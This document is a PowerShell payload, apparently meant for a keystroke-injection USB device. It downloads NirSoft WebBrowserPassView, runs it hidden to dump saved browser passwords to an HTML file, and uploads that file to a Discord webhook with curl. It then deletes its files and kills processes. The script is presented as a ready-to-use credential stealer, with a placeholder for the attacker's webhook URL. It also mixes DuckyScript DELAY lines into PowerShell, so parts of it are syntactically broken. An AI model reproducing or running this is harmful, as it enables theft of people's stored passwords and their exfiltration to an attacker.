# First PowerShell session:

# Set up the temporary folder and clean up if it exists
$tmpfolder = "C:\temp"
if (Test-Path $tmpfolder) {
    Write-Host "Cleaning up existing folder..."
    Remove-Item $tmpfolder -Recurse -Force
}
Write-Host "Creating temporary folder..."
mkdir $tmpfolder
cd $tmpfolder

# Download WebBrowserPassView and 7-Zip
Write-Host "Downloading WebBrowserPassView and 7-Zip..."
Invoke-WebRequest -Uri 'http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip' -OutFile 'wbpv.zip'
Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7za920.zip' -OutFile '7z.zip'

# Expand 7-Zip archive and extract WebBrowserPassView
Write-Host "Expanding 7-Zip archive..."
Expand-Archive '7z.zip'

Write-Host "Extracting WebBrowserPassView.zip..."
.\7z\7za.exe e 'wbpv.zip'

DELAY 2000   # Give time for extraction

# Start WebBrowserPassView tool in hidden mode
Write-Host "Launching WebBrowserPassView tool..."
Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
DELAY 5000   # Allow time for WebBrowserPassView to launch and collect passwords

# Export passwords to HTML file
Write-Host "Exporting passwords to HTML file..."
$exportPath = 'C:\temp\export.htm'

# Start a second PowerShell process to continue the rest of the tasks
Start-Process "powershell" -ArgumentList @'
# Second PowerShell session:

# Focus PowerShell window (ensure the script types into the correct window)
$wshell = New-Object -ComObject wscript.shell

# Function to focus PowerShell window
Function Focus-PowerShellWindow {
    $wshell.AppActivate("PowerShell")  # Bring PowerShell window to the front
    Start-Sleep -Milliseconds 500      # Short pause to ensure it's focused
}

# Focus PowerShell before sending keys
Focus-PowerShellWindow

# Send Ctrl+A to select all and Ctrl+S to open save dialog
$wshell.SendKeys "^a"  # Select all (Ctrl + A)
DELAY 1000
$wshell.SendKeys "^s"  # Save (Ctrl + S)
DELAY 1000
$wshell.SendKeys "$exportPath{ENTER}"  # Enter export path

DELAY 2000  # Wait for the file to save

# Close WebBrowserPassView
Write-Host "Closing WebBrowserPassView..."
Focus-PowerShellWindow
$wshell.SendKeys "%{F4}"  # Alt + F4 to close
DELAY 2000  # Wait for the tool to close

# Send exported file to Discord webhook using curl
Write-Host "Sending exported file to Discord webhook..."
Focus-PowerShellWindow
$webhookUrl = 'DISCORD-WEBHOOK-TO-PUT'  # Replace with your webhook URL
curl.exe -F file1=@"$exportPath" $webhookUrl

# Clean up temporary folder
Write-Host "Cleaning up temporary files..."
Set-Location 'C:\temp'
Remove-Item -Recurse -Force $tmpfolder

# Terminate all related processes
Write-Host "Terminating remaining processes..."
taskkill /F /IM 7za.exe
taskkill /F /IM 7z.exe
taskkill /F /IM powershell.exe

Write-Host "Second part of script completed successfully!"
'@
